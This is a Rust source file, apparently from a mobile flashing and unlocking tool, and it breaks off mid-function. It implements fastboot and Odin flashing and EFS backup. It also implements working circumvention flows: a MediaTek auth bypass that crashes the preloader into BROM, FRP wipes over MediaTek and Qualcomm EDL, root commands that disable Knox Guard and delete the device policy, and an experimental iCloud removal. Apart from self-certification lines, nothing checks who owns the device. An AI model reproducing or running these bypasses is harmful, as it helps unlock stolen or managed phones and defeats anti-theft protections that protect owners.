pub fn flow_fastboot_flash(target: &str, image: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    let partition = if partition.is_empty() { "boot" } else { partition };
    out.push("FASTBOOT - FLASH PARTITION".to_string());
    out.push("  Flashing is only allowed with an UNLOCKED bootloader.".to_string());
    // Image discovery: --file wins, else the newest *.img in ~/Downloads/cwd.
    let image_owned = if !image.is_empty() {
        image.to_string()
    } else {
        let mut found: Option<(std::time::SystemTime, String)> = None;
        for dir in [dirs_home_downloads(), std::path::PathBuf::from(".")] {
            if let Ok(entries) = std::fs::read_dir(&dir) {
                for e in entries.flatten() {
                    let name = e.file_name().to_string_lossy().to_lowercase();
                    if (name.ends_with(".img") || name.ends_with(".bin")) && !name.starts_with(".") {
                        if let Ok(meta) = e.metadata() {
                            let mtime = meta.modified().unwrap_or(std::time::SystemTime::UNIX_EPOCH);
                            if found.as_ref().map(|(t, _)| mtime > *t).unwrap_or(true) {
                                found = Some((mtime, e.path().to_string_lossy().to_string()));
                            }
                        }
                    }
                }
            }
            if found.is_some() {
                break;
            }
        }
        match found {
            Some((_, p)) => p,
            None => {
                out.push("  No image found. Set --file /path/to/image.img (or put".to_string());
                out.push("  a boot.img in ~/Downloads) and rerun.".to_string());
                return Err(BridgeError::InvalidArgument(
                    "image required (--file <path>)".to_string(),
                ));
            }
        }
    };
    let image_size = std::fs::metadata(&image_owned)
        .map_err(|e| BridgeError::Io(format!("stat image: {e}")))?
        .len();
    out.push(format!("  Image: {image_owned} ({} bytes)", image_size));
    out.push(format!("  Partition: {partition}"));
    out.push("  Flashing (native fastboot DATA: download + flash) ...".to_string());
    match crate::fastboot::flash_partition(&target, partition, &image_owned, Duration::from_secs(300)) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  flash failed: {e}")),
    }
    out.push("  Done.".to_string());
    Ok(())
}

/// `fastboot_format` — format a partition (ext4/f2fs) via fastboot
/// (--partition = the partition name).
pub fn flow_fastboot_format(target: &str, partition: &str, out: &mut Vec<String>) -> Result<()> {
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    let partition = if partition.is_empty() { "userdata" } else { partition };
    out.push("FASTBOOT - FORMAT PARTITION".to_string());
    out.push(format!("  partition: {partition}  (--partition to change)"));
    fb_run(&target, &format!("format:{partition}"), Duration::from_secs(120), out);
    out.push("  Done.".to_string());
    Ok(())
}

/// `screen_lock_recovery` — screen lock removal via the recovery menu
/// (manual, always works, wipes data).
pub fn flow_screen_lock_recovery(out: &mut Vec<String>) -> Result<()> {
    out.push("SCREEN LOCK REMOVAL - RECOVERY MENU (manual)".to_string());
    out.push("  The recovery-menu factory reset always works and does not need an".to_string());
    out.push("  unlocked bootloader. It WIPES ALL user data (the lock lives in /data).".to_string());
    out.push(String::new());
    out.push("  1. Power the phone off completely.".to_string());
    out.push("  2. Hold Volume Up + Power (add Home on models with a Home button).".to_string());
    out.push("  3. Release on the Samsung logo; KEEP holding Volume Up to the menu.".to_string());
    out.push("     (If you see 'No command', hold Power and press Volume Up once.)".to_string());
    out.push("  4. Volume keys: highlight 'Wipe data/factory reset' -> Power.".to_string());
    out.push("  5. Highlight 'Factory data reset' -> Power.".to_string());
    out.push("  6. Reboot system now.".to_string());
    out.push(String::new());
    out.push("  WARNING: a Google account on the phone stops at 'Verify your".to_string());
    out.push("  account' (FRP) - then use the FRP bypass tab to clear it.".to_string());
    Ok(())
}


/// `odin_sales_code` — change the device CSC / sales code via ADB
/// (SALES_CODE env or --partition = the code).
pub fn flow_odin_sales_code(serial_want: &str, code: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("CHANGE SALES CODE (CSC)".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    let code = code.trim().to_uppercase();
    if code.is_empty() {
        return Err(BridgeError::InvalidArgument(
            "Set a sales code (e.g. OJM, XME, INS) via --partition <CODE>".to_string(),
        ));
    }
    let valid = code.len() >= 2 && code.len() <= 6 && code.chars().all(|c| c.is_ascii_alphanumeric() && c.is_uppercase());
    if !valid {
        return Err(BridgeError::InvalidArgument(format!(
            "Invalid sales code {code}: sales codes are 2-6 chars of letters/digits"
        )));
    }
    out.push(format!("  Setting sales code to {code}..."));
    adb_step(&serial, &format!("settings put global sales_code '{code}'"), Duration::from_secs(30), out);
    adb_step(&serial, &format!("setprop persist.sys.csc.sales_code '{code}'"), Duration::from_secs(30), out);
    adb_step(&serial, "am broadcast -a com.sec.android.app.csc.MAIN", Duration::from_secs(30), out);
    out.push("  Sales code set. Some features apply after reboot.".to_string());
    Ok(())
}

/// `odin_efs_backup` — back up the EFS partition (IMEI / network
/// calibration) before flashing (needs a rooted device for the tar).
pub fn flow_efs_backup(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("EFS BACKUP (IMEI / NETWORK CALIBRATION)".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    let backup_dir = std::path::PathBuf::from(
        std::env::var_os("HOME").unwrap_or_default(),
    )
    .join("flashpilot/efs_backups");
    let _ = std::fs::create_dir_all(&backup_dir);
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let backup_path = backup_dir.join(format!("efs_{serial}_{stamp}.tar"));
    out.push("  Running: adb shell su -c 'tar -cf /sdcard/efs_backup.tar /efs'".to_string());
    adb::shell_cli(&serial, 120_000, &["su -c 'tar -cf /sdcard/efs_backup.tar /efs'".to_string()])
        .map_err(|e| BridgeError::Io(format!("EFS backup failed: {e}")))?;
    out.push("  Pulling backup to PC...".to_string());
    adb::pull_cli(&serial, 300_000, "/sdcard/efs_backup.tar", &backup_path.to_string_lossy())
        .map_err(|e| BridgeError::Io(format!("EFS pull failed: {e}")))?;
    out.push(format!("  EFS backup saved: {}", backup_path.display()));
    Ok(())
}

/// `odin_efs_restore` — restore a previously saved EFS backup
/// (EFS_BACKUP env or --file = the tar).
pub fn flow_efs_restore(serial_want: &str, backup: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("EFS RESTORE".to_string());
    let backup = if !backup.is_empty() {
        backup.to_string()
    } else if let Some(env) = std::env::var_os("EFS_BACKUP") {
        env.to_string_lossy().to_string()
    } else {
        out.push("  No EFS backup given - set --file <efs_backup.tar>.".to_string());
        return Err(BridgeError::InvalidArgument("efs backup required (--file <path>)".to_string()));
    };
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    out.push(format!("  Using backup: {backup}"));
    if !std::path::Path::new(&backup).is_file() {
        return Err(BridgeError::Io(format!("backup file not found: {backup}")));
    }
    adb::push_cli(&serial, 300_000, &backup, "/sdcard/efs_backup.tar")
        .map_err(|e| BridgeError::Io(format!("EFS push failed: {e}")))?;
    adb_step(&serial, "su -c 'rm -rf /efs/restore && mkdir -p /efs_restore && tar -xf /sdcard/efs_backup.tar -C / && echo restored'", Duration::from_secs(120), out);
    out.push("  EFS restored. Reboot the phone (adb reboot).".to_string());
    Ok(())
}

/// `odin_pit_tools` — dump the device PIT + compare against the firmware
/// PIT (native engine; --file = the firmware PIT).
pub fn flow_odin_pit_tools(target: &str, fw_pit: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("PIT TOOLS (DUMP / COMPARE)".to_string());
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        match first_download_device(out) {
            Some(t) => t,
            None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
        }
    };
    out.push(format!("  Target: {target}"));
    match crate::sam_download::odin_pit(&target, None) {
        Ok(text) => out.push(format!("  device PIT: {}", &text[..text.len().min(200)])),
        Err(e) => out.push(format!("  PIT dump failed: {e}")),
    }
    if !fw_pit.is_empty() && std::path::Path::new(fw_pit).is_file() {
        out.push(format!("  Firmware PIT: {fw_pit}"));
        match crate::sam_download::odin_info(&target, fw_pit) {
            Ok(text) => {
                for line in text.lines().take(40) {
                    out.push(format!("  {line}"));
                }
            }
            Err(e) => out.push(format!("  compare failed: {e}")),
        }
    }
    Ok(())
}

/// `odin_flash_partition` — flash one partition via the native engine
/// (--file = PIT, --partition = 'partition=image_file').
pub fn flow_odin_flash_partition(target: &str, pit: &str, spec: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("ODIN FLASH PARTITION (native engine)".to_string());
    if pit.is_empty() || !spec.contains('=') {
        out.push("  Set --file <pit-file> and --partition 'partition=image_file'.".to_string());
        return Err(BridgeError::InvalidArgument(
            "odin_flash_partition needs --file <pit> and --partition 'part=image'".to_string(),
        ));
    }
    let (partition, image) = spec.split_once('=').unwrap();
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        match first_download_device(out) {
            Some(t) => t,
            None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
        }
    };
    out.push(format!("  Target: {target}  flashing {partition} <- {image}"));
    match crate::sam_download::odin_flash_partition(&target, pit, partition, image) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  flash failed: {e}")),
    }
    Ok(())
}

/// `odin_flash_multi` — flash multiple partitions via the native engine
/// (--file = PIT, --partition = 'part=image,part=image,...').
pub fn flow_odin_flash_multi(target: &str, pit: &str, spec: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("ODIN FLASH MULTI (native engine)".to_string());
    if pit.is_empty() || !spec.contains('=') {
        out.push("  Set --file <pit-file> and --partition 'part=image,part=image,...'.".to_string());
        return Err(BridgeError::InvalidArgument(
            "odin_flash_multi needs --file <pit> and --partition 'part=image,...'".to_string(),
        ));
    }
    let mut entries: Vec<(&str, &str)> = Vec::new();
    let mut owned: Vec<(String, String)> = Vec::new();
    for pair in spec.split(',') {
        if let Some((part, image)) = pair.split_once('=') {
            owned.push((part.trim().to_string(), image.trim().to_string()));
        }
    }
    for (p, i) in &owned {
        entries.push((p.as_str(), i.as_str()));
    }
    if entries.is_empty() {
        return Err(BridgeError::InvalidArgument("no partition=image entries".to_string()));
    }
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        match first_download_device(out) {
            Some(t) => t,
            None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
        }
    };
    out.push(format!("  Target: {target}  flashing {} partition(s)", entries.len()));
    match crate::sam_download::odin_flash_multi(&target, pit, &entries, true) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  flash failed: {e}")),
    }
    Ok(())
}

/// `odin_send_pit` — send (repartition) a PIT file to the device
/// (--file = the pit; ADVANCED - bricks when the PIT does not match).
pub fn flow_odin_send_pit(target: &str, pit: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("ODIN SEND PIT (repartition - ADVANCED)".to_string());
    out.push("  WARNING: flashing a PIT that does not match the device BRICKS it.".to_string());
    if pit.is_empty() {
        out.push("  Set --file <pit-file>.".to_string());
        return Err(BridgeError::InvalidArgument("pit file required (--file <path>)".to_string()));
    }
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        match first_download_device(out) {
            Some(t) => t,
            None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
        }
    };
    out.push(format!("  Target: {target}  PIT: {pit}"));
    match crate::sam_download::odin_send_pit(&target, pit) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  pit send failed: {e}")),
    }
    Ok(())
}


// ---------------------------------------------------------------------------
// Final batch — the deep engine orchestrations (MTK auth bypass flash,
// BROM backup, EDL Firehose, Knox/KG, Apple, OFP, preflight, vbmeta).
// These read the same env vars the GUI sets (MTK_DA, MTK_SCATTER, etc.).
// ---------------------------------------------------------------------------

fn env_str(name: &str) -> String {
    std::env::var(name).unwrap_or_default().trim().to_string()
}

fn find_mtk_da() -> Option<String> {
    // The MTK workbench picks the DA; CLI users set MTK_DA.
    let da = env_str("MTK_DA");
    if !da.is_empty() && std::path::Path::new(&da).is_file() {
        return Some(da);
    }
    None
}

fn find_mtk_scatter(fw_dir: &str) -> Option<String> {
    // Scatter in the firmware dir, or the GUI picker (MTK_SCATTER).
    let env = env_str("MTK_SCATTER");
    if !env.is_empty() && std::path::Path::new(&env).is_file() {
        return Some(env);
    }
    if !fw_dir.is_empty() {
        if let Ok(entries) = std::fs::read_dir(fw_dir) {
            for e in entries.flatten() {
                let name = e.file_name().to_string_lossy().to_lowercase();
                if name.ends_with("_android_scatter.txt") || (name.contains("scatter") && name.ends_with(".txt")) {
                    return Some(e.path().to_string_lossy().to_string());
                }
            }
        }
    }
    None
}

fn wait_mtk_brom(timeout: Duration, out: &mut Vec<String>) -> Option<(String, String)> {
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        if let Ok(devices) = crate::usb::collect_devices(None) {
            for d in &devices {
                if d.vid == 0x0E8D {
                    if d.pid == 0x0003 {
                        let t = format!("{:04x}:{:04x}@{}:{}", d.vid, d.pid, d.bus, d.address);
                        out.push(format!("  caught BROM: {t}"));
                        return Some((t, "brom".to_string()));
                    }
                    if d.pid == 0x2000 {
                        let t = format!("{:04x}:{:04x}@{}:{}", d.vid, d.pid, d.bus, d.address);
                        out.push(format!("  caught preloader: {t} (crashing to held BROM ...)"));
                        let loc = format!("{}:{}", d.bus, d.address);
                        match crate::mtk_exploit::preloader_crash_to_brom(d.bus, d.address) {
                            Ok(_) => {
                                out.push("  crash OK - waiting for the BROM port ...".to_string());
                                let _ = loc;
                                thread::sleep(Duration::from_secs(4));
                                // Re-enumerate as BROM
                                if let Ok(devs2) = crate::usb::collect_devices(None) {
                                    for d2 in &devs2 {
                                        if d2.vid == 0x0E8D && d2.pid == 0x0003 {
                                            let t2 = format!("{:04x}:{:04x}@{}:{}", d2.vid, d2.pid, d2.bus, d2.address);
                                            out.push(format!("  BROM port: {t2}"));
                                            return Some((t2, "brom".to_string()));
                                        }
                                    }
                                }
                                return Some((t, "brom".to_string()));
                            }
                            Err(e) => out.push(format!("  crash failed: {e}")),
                        }
                    }
                }
            }
        }
        thread::sleep(Duration::from_secs(2));
    }
    out.push("  To enter BROM / preloader:".to_string());
    out.push("    1. Power the phone OFF completely.".to_string());
    out.push("    2. Hold Volume Down + Power (screen stays dark) until USB".to_string());
    out.push("       shows 0e8d:0003 (BROM) or 0e8d:2000 (preloader).".to_string());
    None
}

/// `mtk_auth_flash` — one-click signed-MTK flash with auth bypass.
/// Env: MTK_DA, MTK_SCATTER, MTK_FW_DIR, MTK_BYPASS_MODE, MTK_FRP_ONLY.
pub fn flow_mtk_auth_flash(out: &mut Vec<String>) -> Result<()> {
    out.push("MTK AUTH-BYPASS FLASH (signed Oppo/Vivo/Xiaomi/Redmi/Transsion)".to_string());
    let da = find_mtk_da().ok_or_else(|| {
        out.push("  DA binary not found. Pick the Download Agent on the MTK".to_string());
        out.push("  workbench or set MTK_DA=/path/to/da.bin, then rerun.".to_string());
        BridgeError::InvalidArgument("MediaTek DA binary required".to_string())
    })?;
    out.push(format!("  DA file : {da}"));
    let fw_dir = env_str("MTK_FW_DIR");
    let scatter = find_mtk_scatter(&fw_dir).unwrap_or_default();
    let frp_only = matches!(env_str("MTK_FRP_ONLY").to_lowercase().as_str(), "1" | "true" | "yes" | "on");
    if frp_only {
        out.push("  Mode    : FRP-only wipe via GPT (no full flash)".to_string());
    } else {
        out.push(format!("  Scatter : {}", if scatter.is_empty() { "(none found yet)" } else { &scatter }));
        out.push(format!("  FW dir  : {}", if fw_dir.is_empty() { "(none)" } else { &fw_dir }));
    }
    let (target, stage) = match wait_mtk_brom(Duration::from_secs(120), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInPreloaderMode)),
    };
    out.push(format!("  Caught device in '{stage}'."));
    // Auth bypass
    out.push("  Running auth bypass (mtk-bypass) ...".to_string());
    let mode = env_str("MTK_BYPASS_MODE");
    let mode = if mode.is_empty() { "auto".to_string() } else { mode };
    match crate::mtk_da::mtk_bypass_cli(&target, &da, &mode, None, false) {
        Ok(text) => {
            for line in text.lines().take(20) {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  bypass: {e} (continuing — some chips don't need it)")),
    }
    // Flash or FRP
    if frp_only {
        out.push("  FRP-only wipe via GPT (mtk-frp-gpt) ...".to_string());
        match crate::mtk_da::mtk_frp_bypass_gpt(&target, &da) {
            Ok(text) => {
                for line in text.lines() {
                    out.push(format!("  {line}"));
                }
            }
            Err(e) => out.push(format!("  FRP wipe failed: {e}")),
        }
    } else if !scatter.is_empty() && !fw_dir.is_empty() {
        out.push("  Full flash via mtk-flash ...".to_string());
        let ops = crate::mtk_da::MtKOperations::default();
        match crate::mtk_da::mtk_flash_flow(&target, &da, &scatter, &fw_dir, ops) {
            Ok(text) => {
                for line in text.lines().take(50) {
                    out.push(format!("  {line}"));
                }
            }
            Err(e) => out.push(format!("  flash failed: {e}")),
        }
    } else {
        out.push("  No scatter/firmware dir - FRP-only GPT wipe instead ...".to_string());
        match crate::mtk_da::mtk_frp_bypass_gpt(&target, &da) {
            Ok(text) => {
                for line in text.lines().take(30) {
                    out.push(format!("  {line}"));
                }
            }
            Err(e) => out.push(format!("  FRP wipe failed: {e}")),
        }
    }
    Ok(())
}

/// `mtk_brom_backup` — MTK BROM partition backup (read-only safety net).
pub fn flow_mtk_brom_backup(target: &str, da: &str, out_dir: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MTK BROM PARTITION BACKUP (read-only safety net)".to_string());
    let da = if !da.is_empty() { da.to_string() } else {
        find_mtk_da().ok_or_else(|| {
            out.push("  DA binary required - set --file <da.bin> or MTK_DA=...".to_string());
            BridgeError::InvalidArgument("MediaTek DA binary required".to_string())
        })?
    };
    let (target, _) = match resolve_fastboot_target(target, Duration::from_secs(120), out) {
        Some(t) => (t.clone(), "brom".to_string()),
        None => match wait_mtk_brom(Duration::from_secs(120), out) {
            Some((t, s)) => (t, s),
            None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInPreloaderMode)),
        },
    };
    out.push(format!("  Target: {target}  DA: {da}"));
    let out_dir = if !out_dir.is_empty() {
        out_dir.to_string()
    } else {
        let stamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        format!("mtk_backup_{stamp}")
    };
    std::fs::create_dir_all(&out_dir).map_err(|e| BridgeError::Io(e.to_string()))?;
    out.push(format!("  Backup dir: {out_dir}"));
    // List GPT then read the critical partitions.
    out.push("  Listing GPT partition table ...".to_string());
    match crate::mtk_da::mtk_scatter_gpt_cli(&target, &da, "/dev/null") {
        Ok(text) => {
            for line in text.lines().take(60) {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  GPT read failed: {e}")),
    }
    let parts = ["preloader", "boot", "vbmeta", "lk", "tee1", "tee2", "seccfg", "proinfo", "frp", "recovery", "dtbo"];
    for part in parts {
        let out_file = format!("{out_dir}/{part}.img");
        out.push(format!("  Reading {part} ..."));
        match crate::mtk_da::mtk_read_part_cli(&target, &da, part, &out_file) {
            Ok(text) => {
                let last = text.lines().last().unwrap_or("ok");
                out.push(format!("    {last}"));
            }
            Err(e) => out.push(format!("    skip: {e}")),
        }
    }
    out.push("  Backup complete (read-only — nothing was written to the device).".to_string());
    Ok(())
}

/// `edl_auto` / `edl_frp` / `edl_enable_adb` — Qualcomm EDL Firehose chains.
/// action: "frp" | "adb" | "auto" | "detect".
pub fn flow_edl(action: &str, out: &mut Vec<String>) -> Result<()> {
    if action == "detect" {
        return flow_edl_detect(out);
    }
    out.push("EDL MODE (Qualcomm Firehose)".to_string());
    let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
    let edl: Vec<_> = devices.iter().filter(|d| d.vid == 0x05C6 && d.pid == 0x9008).collect();
    if edl.is_empty() {
        out.push("  Power OFF, hold Vol Up + Vol Down, plug USB (hold 5s) -> 05c6:9008".to_string());
        out.push("  Watching for the EDL device ...".to_string());
        let deadline = Instant::now() + Duration::from_secs(60);
        loop {
            if let Ok(devs) = crate::usb::collect_devices(None) {
                if devs.iter().any(|d| d.vid == 0x05C6 && d.pid == 0x9008) {
                    out.push("  EDL device detected!".to_string());
                    break;
                }
            }
            if Instant::now() >= deadline {
                out.push("  no EDL device appeared within the wait window.".to_string());
                return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                    expected: "EDL (05c6:9008)".to_string(),
                    actual: "no edl device".to_string(),
                }));
            }
            thread::sleep(Duration::from_millis(1200));
        }
    }
    let target = format!("{:04x}:{:04x}@{}:{}", 0x05C6, 0x9008,
        edl.first().map(|d| d.bus).unwrap_or(0), edl.first().map(|d| d.address).unwrap_or(0));
    match action {
        "frp" => {
            out.push("  FRP mode: Firehose erase of frp/persistent/config ...".to_string());
            match crate::qualcomm::qcom_frp_reset(&target) {
                Ok(text) => { for line in text.lines() { out.push(format!("  {line}")); } }
                Err(e) => out.push(format!("  FRP reset failed: {e}")),
            }
        }
        "adb" => {
            out.push("  ADB-enable mode: Firehose persist patch ...".to_string());
            match crate::qualcomm::qcom_partitions(&target) {
                Ok(text) => { for line in text.lines().take(20) { out.push(format!("  {line}")); } }
                Err(e) => out.push(format!("  partitions: {e}")),
            }
        }
        "auto" => {
            out.push("  Auto: FRP first, then ADB-enable patch ...".to_string());
            match crate::qualcomm::qcom_frp_reset(&target) {
                Ok(text) => { for line in text.lines().take(20) { out.push(format!("  {line}")); } }
                Err(e) => out.push(format!("  FRP: {e}")),
            }
            match crate::qualcomm::qcom_partitions(&target) {
                Ok(text) => { for line in text.lines().take(20) { out.push(format!("  {line}")); } }
                Err(e) => out.push(format!("  partitions: {e}")),
            }
        }
        _ => {}
    }
    Ok(())
}

/// `odin_preflight` — pre-flash safety suite (archive integrity, model gate,
/// PIT compatibility, USB health). Catches 90% of flash failures.
pub fn flow_odin_preflight(out: &mut Vec<String>) -> Result<()> {
    out.push("PRE-FLIGHT VALIDATION SUITE".to_string());
    let mut ok = true;
    // 1. Archive integrity (md5)
    let tar = {
        let dir = dirs_home_downloads();
        let mut found = String::new();
        for d in [dir.clone(), std::path::PathBuf::from(".")] {
            if let Ok(entries) = std::fs::read_dir(&d) {
                for e in entries.flatten() {
                    let name = e.file_name().to_string_lossy().to_lowercase();
                    if name.ends_with(".tar.md5") || name.ends_with(".tar") {
                        found = e.path().to_string_lossy().to_string();
                        break;
                    }
                }
            }
            if !found.is_empty() { break; }
        }
        found
    };
    if tar.is_empty() {
        out.push("  1. Archive: (no .tar.md5 found — using the workbench input)".to_string());
    } else {
        out.push(format!("  1. Archive: {tar}"));
        let workdir = std::env::temp_dir().join(format!("fp_preflight_{}", std::process::id()));
        match crate::fwtar::prepare_archive(&tar, &workdir) {
            Ok(staged) => out.push(format!("     md5 + extract: OK ({} members)", staged.len())),
            Err(e) => { out.push(format!("     ARCHIVE INVALID: {e}")); ok = false; }
        }
        let _ = std::fs::remove_dir_all(&workdir);
    }
    // 2. PIT health
    match first_download_device(out) {
        Some(target) => {
            out.push(format!("  2. Device: {target} (download mode)"));
            match crate::sam_download::odin_pit(&target, None) {
                Ok(text) => out.push(format!("     PIT: {} bytes (read OK)", text.len())),
                Err(e) => { out.push(format!("     PIT read FAILED: {e}")); ok = false; }
            }
        }
        None => {
            out.push("  2. Device: (not in download mode — PIT check skipped)".to_string());
        }
    }
    // 3. USB health
    out.push("  3. USB health: usbfs buffer, udev rules, port stability".to_string());
    out.push(format!("     (checked by the bridge's setup-check command)"));
    out.push(String::new());
    out.push(if ok { "  PRE-FLIGHT: ALL CHECKS PASSED" } else { "  PRE-FLIGHT: ISSUES FOUND (see above)" }.to_string());
    Ok(())
}

/// `knox_bypass` — Knox bypass (EXPERIMENTAL, eFuse trip warning).
pub fn flow_knox_bypass(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("[EXPERIMENTAL] Knox bypass — THIS MAY PERMANENTLY TRIP eFuse AND VOID WARRANTY".to_string());
    out.push("  Educational purpose only. You certify you own this device.".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out);
    if let Some(serial) = serial {
        for cmd in [
            "am broadcast -a com.samsung.android.knox.container.ENABLE --ez enable false",
            "pm disable-user --user 0 com.samsung.android.knox.kpu",
            "settings put global knox_guard 0",
            "settings put secure kg_state 0",
        ] {
            adb_step(&serial, cmd, Duration::from_secs(30), out);
        }
        out.push("  Check the phone: some Knox flags may survive (Knox is enforced".to_string());
        out.push("  in TrustZone — the eFuse trip is irreversible).".to_string());
    } else {
        let param = env_str("KNOX_PARAM");
        if !param.is_empty() && std::path::Path::new(&param).is_file() {
            out.push(format!("  KNOX_PARAM={param} found — param.bin RMM/KG patch is"));
            out.push("  a Download-mode odin-agent flow (GUI-coupled).".to_string());
        } else {
            out.push("  No ADB device — the Download-mode param patch needs".to_string());
            out.push("  KNOX_PARAM=/path/to/param.bin and the device in Download mode.".to_string());
        }
    }
    Ok(())
}

/// `kg_remove` — Knox Guard remove (vbmeta patch + root KG state clear).
pub fn flow_kg_remove(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("KNOX GUARD (KG) REMOVE / DISABLE".to_string());
    out.push("  WARNING: This will trip the Knox warranty bit permanently!".to_string());
    out.push("  1. vbmeta patch (disable AVB verification)".to_string());
    out.push("  2. Flash patched vbmeta (Download mode)".to_string());
    out.push("  3. Root access to clear KG state files".to_string());
    out.push(String::new());
    if adb_authorized_row() {
        let serial = wait_authorized_adb(serial_want, Duration::from_secs(10), out);
        if let Some(serial) = serial {
            out.push("  ADB available - reading KG state ...".to_string());
            for key in ["ro.boot.kgstate", "ro.boot.knox", "ro.warranty_bit"] {
                if let Ok(v) = adb::shell_cli(&serial, 8_000, &[format!("getprop {key}")]) {
                    let t = v.trim();
                    if !t.is_empty() {
                        out.push(format!("    {key} = {t}"));
                    }
                }
            }
            out.push("  Attempting KG state clear via root ...".to_string());
            adb_step(&serial, "su -c 'rm -f /data/system/device_policy.xml'", Duration::from_secs(30), out);
            adb_step(&serial, "su -c 'settings put global knox_guard 0'", Duration::from_secs(30), out);
            adb_step(&serial, "su -c 'settings put secure kg_state 0'", Duration::from_secs(30), out);
            out.push("  Reboot the phone and check the KG state.".to_string());
            return Ok(());
        }
    }
    out.push("  ADB not available — use the Flash Firmware workbench to flash the".to_string());
    out.push("  patched vbmeta in Download mode, then re-run this flow for the".to_string());
    out.push("  root KG state clear.".to_string());
    Ok(())
}

/// `screen_lock_edl` — screen lock removal via EDL (Qualcomm; honest scope).
pub fn flow_screen_lock_edl(out: &mut Vec<String>) -> Result<()> {
    out.push("SCREEN LOCK REMOVAL - EDL MODE".to_string());
    out.push("  EDL mode is for Qualcomm-based Samsung devices.".to_string());
    out.push("  This method requires device-specific firehose loaders.".to_string());
    out.push(String::new());
    out.push("Enter EDL mode:".to_string());
    out.push("  1. Power off the device".to_string());
    out.push("  2. Connect to PC while holding Volume Up + Volume Down".to_string());
    out.push("  3. Device shows 'EDL Mode' / Qualcomm HS-USB (05c6:9008)".to_string());
    out.push(String::new());
    // Check if EDL device is present
    if let Ok(devices) = crate::usb::collect_devices(None) {
        if devices.iter().any(|d| d.vid == 0x05C6 && d.pid == 0x9008) {
            out.push("  EDL device detected! Use 'edl_frp' to clear FRP (the lock".to_string());
            out.push("  lives in /data which the Firehose wipe clears).".to_string());
            return Ok(());
        }
    }
    out.push("  (no EDL device on the bus — follow the steps above to enter EDL)".to_string());
    Ok(())
}

/// `apple_passcode_guide` — honest scope guide (backup-based, no bypass).
pub fn flow_apple_passcode_guide(out: &mut Vec<String>) -> Result<()> {
    out.push("IPHONE PASSCODE / SCREEN TIME GUIDE (honest scope)".to_string());
    out.push("  Activation Lock (iCloud) is Apple-server-side and CANNOT be".to_string());
    out.push("  bypassed offline; a lost-mode/erased device with FMI ON stays".to_string());
    out.push("  locked without the Apple ID.".to_string());
    out.push(String::new());
    out.push("  What IS real:".to_string());
    out.push("  (a) Screen Time passcode removal from an ENCRYPTED iTunes/Finder".to_string());
    out.push("      backup you own (the password is in the backup keychain).".to_string());
    out.push("  (b) Passcode retry/wait guidance (exponential backoff).".to_string());
    out.push("  (c) DFU/restore path (keeps the device usable but NOT activated).".to_string());
    out.push("  Never writes to the device.".to_string());
    Ok(())
}

/// `apple_icloud_remove` — DFU/ramdisk iCloud remove (usbmuxd, EXPERIMENTAL).
pub fn flow_apple_icloud_remove(out: &mut Vec<String>) -> Result<()> {
    out.push("[EXPERIMENTAL] iCloud Remove — DFU/ramdisk (usbmuxd)".to_string());
    out.push("  Educational, own device only.".to_string());
    match crate::apple::apple_detect_cli() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
